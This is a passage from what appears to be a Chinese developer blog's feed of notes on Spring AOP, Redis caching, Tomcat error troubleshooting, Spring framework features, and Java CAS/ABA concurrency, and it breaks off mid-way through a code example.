                    <span class="token class-name">RedisSerializationContext<span class="token punctuation">.</span>SerializationPair</span><span class="token punctuation">.</span><span class="token function">fromSerializer</span><span class="token punctuation">(</span>redisTemplate<span class="token punctuation">.</span><span class="token function">getValueSerializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RedisCacheManager</span><span class="token punctuation">(</span>redisCacheWriter<span class="token punctuation">,</span> redisCacheConfiguration<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>Spring Cache</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring基础-AOP</title>
    <url>/20230319/28678f43.html</url>
    <content><![CDATA[<h1>拦截器类型</h1>
<ul>
<li>@Before：这种拦截器先执行拦截代码，再执行目标代码。如果拦截器抛异常，那么目标代码就不执行了；</li>
<li>@After：这种拦截器先执行目标代码，再执行拦截器代码。无论目标代码是否抛异常，拦截器代码都会执行；</li>
<li>@AfterReturning：和@After不同的是，只有当目标代码正常返回时，才执行拦截器代码；</li>
<li>@AfterThrowing：和@After不同的是，只有当目标代码抛出了异常时，才执行拦截器代码；</li>
<li>@Around：能完全控制目标代码是否执行，并可以在<strong>执行前后、抛异常后执行任意拦截代码</strong>，可以说是包含了上面所有功能</li>
</ul>
<h1>使用注解装配AOP的DEMO</h1>
<ol>
<li>
<p>依赖引入</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>aspectjweaver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.9.19<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>spring-aop：AOP核心功能，例如代理工厂等</p>
<p>aspectjweaver：支持切入点表达式等</p>
<p>aspectjrt：支持aop相关注解等</p>
<p>aspectjweaver包含aspectjrt的内容，所以我们只需要引入aspectjweaver依赖包就可以了</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230319183014032.png" alt="aspectjweaver包含aspectjrt的内容"></p>
</blockquote>
</li>
<li>
<p>定义一个性能监控的注解</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Inherited</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">MetricTime</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>定义切面</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>local<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">MetricTime</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">ProceedingJoinPoint</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Around</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Aspect</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">Duration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">Instant</span></span><span class="token punctuation">;</span>


<span class="token annotation punctuation">@Slf4j</span>
<span class="token annotation punctuation">@Aspect</span>
<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MetricAspect</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"@annotation(metricTime)"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">metric</span><span class="token punctuation">(</span><span class="token class-name">ProceedingJoinPoint</span> proceedingJoinPoint<span class="token punctuation">,</span> <span class="token class-name">MetricTime</span> metricTime<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Around.begin............."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Instant</span> start <span class="token operator">=</span> <span class="token class-name">Instant</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">long</span> spend <span class="token operator">=</span> <span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">between</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> <span class="token class-name">Instant</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Metrics][%s]-消耗：%d 毫秒"</span><span class="token punctuation">,</span> metricTime<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> spend<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Around.end............."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>在需要被监控的关键方法上标注该注解</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>local<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">MetricTime</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigController</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@ResponseBody</span>
    <span class="token annotation punctuation">@MetricTime</span><span class="token punctuation">(</span><span class="token string">"aop"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/aop/test"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Long</span> <span class="token function">testAopSpend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">summingLong</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>启动类上标注<code>@EnableAspectJAutoProxy</code></p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@EnableAspectJAutoProxy</span>
<span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigurationApplication</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">ConfigurationApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>AspectJ定义AOP装配规则</h1>
<table>
<thead>
<tr>
<th>装配规则</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>“execution(public * com.itranswarp.learnjava.service.<em>.</em>(…))”</td>
<td>某个service包下面的所有Bean的所有方法都会被拦截</td>
</tr>
<tr>
<td>“execution(public * update*(…))”</td>
<td>方法名前缀进行拦截。<br>这种非精准打击误伤面更大，因为从方法前缀区分是否是数据库操作是非常不可取的。</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1>AOP 可能造成的空指针</h1>
<p>参考：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1339039378571298">https://www.liaoxuefeng.com/wiki/1252599548343744/1339039378571298</a></p>
<blockquote>
<p>Spring通过CGLIB创建的代理类，不会初始化代理类自身继承的任何成员变量，包括final类型的成员变量！</p>
</blockquote>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat异常排查记录</title>
    <url>/20221030/932ec968.html</url>
    <content><![CDATA[<h1>500 Internal Server Error</h1>
<p>原因1：是服务本身的问题（后台日志能查到原因）</p>
<p>原因2：是Nginx服务器的原因。</p>
<p>可参考原因： （未验证）</p>
<p>1.上传的文件权限设置错误</p>
<p>2.htaccess文件写入错误的代码</p>
<h2 id="java-lang-NoSuchMethodException-org-apache-catalina-deploy-WebXml-addFilter">java.lang.NoSuchMethodException: org.apache.catalina.deploy.WebXml addFilter</h2>
<pre class="line-numbers language-none"><code class="language-none">java.lang.NoSuchMethodException: org.apache.catalina.deploy.WebXml addFilter
  at org.apache.tomcat.util.IntrospectionUtils.callMethod1(IntrospectionUtils.java:855)
  at org.apache.tomcat.util.digester.SetNextRule.end(SetNextRule.java:201)
  at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1051)
  at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)
  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanEndElement(XMLDocumentFragmentScannerImpl.java:1774)
  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2930)
  at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:510)
  at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:807)
  at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
  at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:107)
  at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
  at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
  at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1537)
  at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1825)
  at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1201)
  at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)
  at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)
  at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
  at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) 
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解决方法为：在Tomacat7的<code>context.xml</code>文件里的<code>&lt;Context&gt;</code>中加上<code>&lt;Loader delegate="true" /&gt;</code></p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring基础</title>
    <url>/20230319/d607e27b.html</url>
    <content><![CDATA[<h3 id="Spring的特性和优势">Spring的特性和优势</h3>
<blockquote>
<p>Spring Framework有哪些特性，用了这个框架对开发而言有什么好处呢？</p>
</blockquote>
<p>从Spring 框架的<strong>特性</strong>来看：</p>
<ul>
<li>非侵入式：基于Spring开发的应用中的对象可以不依赖于Spring的API</li>
<li>控制反转：<code>IOC——Inversion of Control</code>，指的是将对象的创建权交给 Spring 去创建。使用 Spring 之前，对象的创建都是由我们自己在代码中new创建。而使用 Spring 之后。对象的创建都是给了 Spring 框架。</li>
<li>依赖注入：<code>DI——Dependency Injection</code>，是指依赖的对象不需要手动调用 setXX 方法去设置，而是通过配置赋值。</li>
<li>面向切面编程：<code>Aspect Oriented Programming——AOP</code></li>
<li>容器：Spring 是一个容器，因为它包含并且管理应用对象的生命周期</li>
<li>组件化：Spring 实现了使用简单的组件配置组合成一个复杂的应用。在 Spring 中可以使用XML和Java注解组合这些对象。</li>
<li>一站式：在 IOC 和 AOP 的基础上可以整合各种企业应用的开源框架和优秀的第三方类库（实际上 Spring 自身也提供了表现层的 SpringMVC 和持久层的 Spring JDBC）</li>
</ul>
<p>从使用Spring 框架的<strong>好处</strong>看：</p>
<ul>
<li>Spring 可以使开发人员使用 POJOs 开发企业级的应用程序。只使用 POJOs 的好处是你不需要一个 EJB 容器产品，比如一个应用程序服务器，但是你可以选择使用一个健壮的 servlet 容器，比如 Tomcat 或者一些商业产品。</li>
<li>Spring 在一个单元模式中是有组织的。即使包和类的数量非常大，你只要担心你需要的，而其它的就可以忽略了。</li>
<li>Spring 不会让你白费力气做重复工作，它真正的利用了一些现有的技术，像 ORM 框架、日志框架、JEE、Quartz 和 JDK 计时器，其他视图技术。</li>
<li>测试一个用 Spring 编写的应用程序很容易，因为环境相关的代码被移动到这个框架中。此外，通过使用 JavaBean-style POJOs，它在使用依赖注入注入测试数据时变得更容易。</li>
<li>Spring 的 web 框架是一个设计良好的 web MVC 框架，它为比如 Structs 或者其他工程上的或者不怎么受欢迎的 web 框架提供了一个很好的供替代的选择。MVC 模式导致应用程序的不同方面(输入逻辑，业务逻辑和UI逻辑)分离，同时提供这些元素之间的松散耦合。模型(Model)封装了应用程序数据，通常它们将由 POJO 类组成。视图(View)负责渲染模型数据，一般来说它生成客户端浏览器可以解释 HTML 输出。控制器(Controller)负责处理用户请求并构建适当的模型，并将其传递给视图进行渲染。</li>
<li>Spring 对 JavaEE 开发中非常难用的一些 API（JDBC、JavaMail、远程调用等），都提供了封装，使这些API应用难度大大降低。</li>
<li>轻量级的 IOC 容器往往是轻量级的，例如，特别是当与 EJB 容器相比的时候。这有利于在内存和 CPU 资源有限的计算机上开发和部署应用程序。</li>
<li>Spring 提供了一致的事务管理接口，可向下扩展到（使用一个单一的数据库，例如）本地事务并扩展到全局事务（例如，使用 JTA）</li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Java并发包</title>
    <url>/20221101/3c508c34.html</url>
    <content><![CDATA[<h1>Atomic包</h1>
<h2 id="CAS-Compare-And-Swap-：比较并交换">CAS(Compare And Swap)：比较并交换</h2>
<p><code>CAS</code>即<code>Compare And Swap</code>的缩写，翻译成中文就是<strong>比较并交换</strong>，其作用是让CPU比较内存中某个值是否和预期的值相同，如果相同则将这个值更新为新值，不相同则不做更新，也就是CAS是<strong>原子性</strong>的操作(读和写两者同时具有原子性)，其实现方式是通过借助<code>C/C++</code>调用CPU指令完成的，所以效率很高。(使用的是最快失败策略)<br>
<code>CAS</code>的原理很简单，这里使用一段<code>Java</code>代码来描述</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">compareAndSwap</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">,</span> <span class="token keyword">int</span> expect<span class="token punctuation">,</span> <span class="token keyword">int</span> update<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 如果内存中的值value和期望值expect一样 则将值更新为新值update</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> expect<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        value <span class="token operator">=</span> update<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大致过程是将内存中的值、我们的期望值、新值交给CPU进行运算，如果内存中的值和我们的期望值相同则将值更新为新值，否则不做任何操作。这个过程是在CPU中完成的，这里不好描述CPU的工作过程，就拿Java代码来描述了。</p>
<h3 id="Unsafe源码分析">Unsafe源码分析</h3>
<p>​    Java是在<code>Unsafe(sun.misc.Unsafe)</code>类实现<code>CAS</code>的操作，而我们知道Java是无法直接访问操作系统底层的API的（原因是Java的跨平台性限制了Java不能和操作系统耦合），所以Java并没有在<code>Unsafe</code>类直接实现<code>CAS</code>的操作，而是通过**JDI(Java Native Interface)**本地调用<code>C/C++</code>语言来实现<code>CAS</code>操作的。</p>
<p><code>Unsafe</code>有很多个<code>CAS</code>操作的相关方法，这里举例几个</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">native</span> <span class="token keyword">boolean</span> <span class="token function">compareAndSwapObject</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token keyword">long</span> var2<span class="token punctuation">,</span> <span class="token class-name">Object</span> var4<span class="token punctuation">,</span> <span class="token class-name">Object</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">native</span> <span class="token keyword">boolean</span> <span class="token function">compareAndSwapInt</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token keyword">long</span> var2<span class="token punctuation">,</span> <span class="token keyword">int</span> var4<span class="token punctuation">,</span> <span class="token keyword">int</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">native</span> <span class="token keyword">boolean</span> <span class="token function">compareAndSwapLong</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token keyword">long</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span> var4<span class="token punctuation">,</span> <span class="token keyword">long</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们拿<code>public final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5);</code>进行分析</p>
<p>这个方法是比较内存中的一个值（整型）和我们的期望值（var4）是否一样，如果一样则将内存中的这个值更新为<code>var5</code>，参数中的<code>var1</code>是值所在的对象，<code>var2</code>是值在对象(var1)中的内存偏移量，<strong>参数var1和参数var2是为了定位出值所在内存的地址</strong>。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/7126254-55d47d5ebef3b1e2-16380810237142.webp" alt="img"></p>
<p><strong>Unsafe.java在这里发挥的作用有：</strong></p>
<ol>
<li>将对象引用、值在对象中的偏移量、期望的值和欲更新的新值传递给<code>Unsafe.cpp</code></li>
<li>如果值更新成功则返回<code>true</code>给开发者，没有更新则返回<code>false</code></li>
</ol>
<p><strong>Unsafe.cpp在这里发挥的作用有：</strong></p>
<ol>
<li>接受从<code>Unsafe</code>传递过来的对象引用、偏移量、期望的值和欲更新的新值，根据对象引用和偏移量<strong>计算出值的地址</strong>，然后将值的地址、期望的值、欲更新的新值传递给CPU</li>
<li>如果值更新成功则返回<code>true</code>给<code>Unsafe.java</code>，没有更新则返回<code>false</code></li>
</ol>
<p><strong>CPU在这里发挥的作用：</strong></p>
<ol>
<li>接受从<code>Unsafe.cpp</code>传递过来的地址、期望的值和欲更新的新值，执行指令<code>cmpxchg</code>，比较地址中的值是否和期望的值一样，一样则将值更新为新的值，不一样则不做任何操作</li>
<li>将操作结果返回给<code>Unsafe.cpp</code></li>
</ol>
<h3 id="CAS的缺点：ABA">CAS的缺点：ABA</h3>
<p><strong><code>ABA</code>说明</strong></p>
<blockquote>
<p>在多线程场景下<code>CAS</code>会出现<code>ABA</code>问题，关于ABA问题这里简单科普下，例如有2个线程同时对同一个值(初始值为A)进行CAS操作，这三个线程如下</p>
<ol>
<li>线程1，期望值为A，欲更新的值为B</li>
<li>线程2，期望值为A，欲更新的值为B</li>
<li>线程3，期望值为B，欲更新的值为A</li>
</ol>
<p>线程<code>1</code>抢先获得CPU时间片，而线程<code>2</code>因为其他原因阻塞了；线程<code>1</code>取值与期望的A值比较，发现相等然后将值更新为B；</p>
<p>这个时候<strong>出现了线程<code>3</code></strong>，线程3取值与期望的值B比较，发现相等则将值更新为A；</p>
<p>此时线程<code>2</code>从阻塞中恢复，并且获得了CPU时间片，这时候线程<code>2</code>取值与期望的值A比较，发现相等则将值更新为B</p>
<p>虽然线程<code>2</code>也完成了操作，但是线程<code>2</code>并不知道值已经经过了<code>A-&gt;B-&gt;A</code>的变化过程。</p>
</blockquote>
<p><strong><code>ABA</code>问题带来的危害</strong></p>
<blockquote>
<p>小明在提款机，提取了50元，因为提款机问题，有两个线程，同时把余额从100变为50</p>
<ul>
<li>
<p>线程1（提款机）：获取当前值100，期望更新为50，</p>
</li>
<li>
<p>线程2（提款机）：获取当前值100，期望更新为50，</p>
</li>
</ul>
<p>线程1成功执行，线程2某种原因block了，这时，某人给小明汇款50</p>
<ul>
<li>线程3（某人）：获取当前值50，期望更新为100，</li>
</ul>
<p>这时候线程3成功执行，余额变为100，<br>
线程2从Block中恢复，获取到的也是100，compare之后，继续更新余额为50</p>
<p><strong>此时可以看到，实际余额应该为100（100-50+50），但是实际上变为了50（100-50+50-50）这就是ABA问题带来的成功提交。</strong></p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testAtomicReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
  <span class="token keyword">final</span> <span class="token class-name">Integer</span> moneyTotal <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
  <span class="token class-name">AtomicInteger</span> money <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span>moneyTotal<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token class-name">Thread</span> t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    money<span class="token punctuation">.</span><span class="token function">getAndAdd</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
